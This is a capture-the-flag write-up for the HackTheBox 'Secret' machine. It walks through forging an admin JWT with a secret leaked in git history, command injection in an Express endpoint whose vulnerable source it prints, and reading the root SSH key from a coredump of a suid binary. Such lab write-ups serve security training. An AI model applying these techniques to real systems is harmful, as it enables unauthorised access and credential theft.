# HACKTHEBOX: Secret

Secret is an easy linux box that runs a web application, that uses JWT tokens to authenticate users to it's API. The provided source code for this API reveals the secret used to encrypt the tokens, allowing any user to tamper their JWT token to gain admin privileges to the API. Then, the user can exploit an admin-only feature in the API vulnerable to command injection to get a user on the box. In the `/opt` directory is a suid binary that can count the characters in any file. Use this binary to read `/root/.ssh/id_rsa` and forcefully crash the program with `kill -SIGSEGV` to generate a coredump file. Finally, extract the coredump file to view the contents of the root user's ssh key.

## Recon and Enumeration
First, run an nmap scan on the box. SSH is open on port 22, HTTP is open on port 80, and there's some other HTTP application on port 3000.
```
# Nmap 7.92 scan initiated Wed Dec 15 19:44:16 2021 as: nmap -AT5 -p- -oA secret -v 10.10.11.120
Nmap scan report for 10.10.11.120
Host is up (0.12s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 49.605 days (since Wed Oct 27 05:15:24 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   120.66 ms 10.10.14.1
2   121.12 ms 10.10.11.120

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 15 19:46:35 2021 -- 1 IP address (1 host up) scanned in 139.62 seconds
```

##### Using the API
The site shows documentation for an API. Use the API and explore.
![frontpage](screenshots/frontpage.png)

First, use the API to register a user with a name, email, and password.
![register docs](screenshots/register_docs.png)
![register](screenshots/register.png)

Second, use the API to log in to the new user. The auth-token returned is a JWT token.
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJhYjI4MzczOTA4MzA0NjM4NzNjM2IiLCJuYW1lIjoiaGVsbG93b3JsZCIsImVtYWlsIjoiaGVsbG93b3JsZEBkYXNpdGgud29ya3MiLCJpYXQiOjE2Mzk2MjYyMDB9.ioNBR7ebu4DmgfGNRyXaXJxtL7eVd57SG1BtljGjVig
```
![login docs](screenshots/login_docs.png)
![login](screenshots/login.png)

Use the jwt token to check privileges. Here it's shown that the JWT token returns a normal user.
![auth priv user](screenshots/auth_priv_user.png)

##### Source Code Review
In the meantime, investigate the source code download for the web app.
![source download](screenshots/source_download.png)

The TOKEN_SECRET environment variable represents the JWT secret. The JWT secret can be used tamper with the JWT token.
![source current](screenshots/source_current.png)

Looking at previous commits, there is a commit message labeled as `removed .env for security reasons`.
![git log](screenshots/git_log.png)

Revert to the commit *just before* the removal of .env, and view the `.env` file. This reveals that the JWT secret is 
```
gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```
![git reset](screenshots/git_reset.png)

Looking through other files, this snippet from `routes/private.js` shows two api endpoints: `/priv` and `/logs`.
`/priv` returns admin privileges if the name is `theadmin`. On the other hand, the endpoint `/logs` calls the `exec` function and directly injects the `file` parameter, but only if the username is `theadmin`.

If the JWT token can be tampered to change the username to `theadmin`, then arbitrary commands can be injected into `/logs`.
```js
router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})


router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

## Exploitation and user.txt
##### JWT Tampering
The python program `jwt-tool` can be used to tamper with the JWT token returned by the `/api/user/login` endpoint.
Just looking at the user token normally, the name is "helloworld". This name should be tampered to "theadmin"
![jwt info](screenshots/jwt_info.png)

Tamper the jwt token using the secret. with the command `jwt-tool $TOKEN -T -S hs256 -p $SECRET`
```
Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] _id = "61bab2837390830463873c3b"
[2] name = "helloworld"
[3] email = "helloworld@dasith.works"
[4] iat = 1639626200    ==> TIMESTAMP = 2021-12-15 20:43:20 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 2

Current value of name is: helloworld
Please enter new value and hit ENTER
> "theadmin"
[1] _id = "61bab2837390830463873c3b"
[2] name = "theadmin"
[3] email = "helloworld@dasith.works"
[4] iat = 1639626200    ==> TIMESTAMP = 2021-12-15 20:43:20 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_22d71bee6e186dd3e94537d75fac5330 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJhYjI4MzczOTA4MzA0NjM4NzNjM2IiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImhlbGxvd29ybGRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM5NjI2MjAwfQ.qqUfufzigH5DxLoxU8I192t1C_WHFlg8Jgn__e8_ChQ
```

Here, the name was changed to `theadmin` and the new JWT is 
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJhYjI4MzczOTA4MzA0NjM4NzNjM2IiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImhlbGxvd29ybGRAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM5NjI2MjAwfQ.qqUfufzigH5DxLoxU8I192t1C_WHFlg8Jgn__e8_ChQ
```

Send the get request to `/api/priv` to confirm admin privileges with the new JWT token.
![admin](screenshots/admin.png)

Send a get request to `/api/logs`. It is runnign the command `git log --oneline <file>`
![admin logs](screenshots/admin_logs.png)

Send a URL encoded payload into the ?file field of the url. To abuse remote code execution.
![rce](screenshots/rce.png)

## Privilege Escalataion and root.txt
Upgrade the shell with
```
python3 -c "__import__('pty').spawn('/bin/bash')"
^Z
stty -echo raw
fg
export TERM=xterm
stty rows rows 38 columns 154 
```

Search for suid binaries on the machine with the command. Most of these binaries are supposed to have suid bits, which is normal. However, `/opt/count` is the binary that sticks out.
```
find / -perm -u=s -type f 2>/dev/null
```
![suids](screenshots/suids.png)

The binary `count` and the source code `count.c` are both located in the `/opt` directory.
![opt](screenshots/opt.png)

Running the program `./count` shows that it can run on files and directories running as root.
![count](screenshots/count.png)

This is the contents of `count.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

Note that coredump generation is enabled with this line.
```c
prctl(PR_SET_DUMPABLE, 1);
```
According to [stack overflow](https://stackoverflow.com/questions/775872/why-are-core-dump-files-generated), a coredump will be generated when the process recieves a certain signal, such as SIGSEGV. According to [this wiki page](https://bash.cyberciti.biz/guide/Sending_signal_to_Processes), signals cand be sent to processes with the `kill` command.

Run the program, and then find the name of the running process. Killing the program with `kill -SIGSEGV <pid>` forces the segfault.
![segfault](screenshots/segfault.png)

According to this [stack overflow post](https://unix.stackexchange.com/questions/277331/segmentation-fault-core-dumped-to-where-what-is-it-and-why), segfault coredumps get stored in `/var/crash` in Ubuntu. The box is in fact an Ubntu machine, and in the `/var/crash` directory, there is one .crash file owned by the `dasith` user and was just recently created.
![var crash](screenshots/var_crash.png)

Move this crash file to the home directory in order to analyze it. Then the command `apport-unpack` can be used to analyze the coredump files. Most of the files extracted, such as `Architecture` or `Uname` are just metadata, while the largest file `CoreDump` actually contains userful information.
![apport unpack](screenshots/apport_unpack.png)
![files](screenshots/files.png)

Run `strings` on the coredump file, and pipe it into `less` in order to find the ssh key for the root user.
```
strings CoreDump | less
```
![id rsa](screenshots/id_rsa.png)
![root](screenshots/root.png)
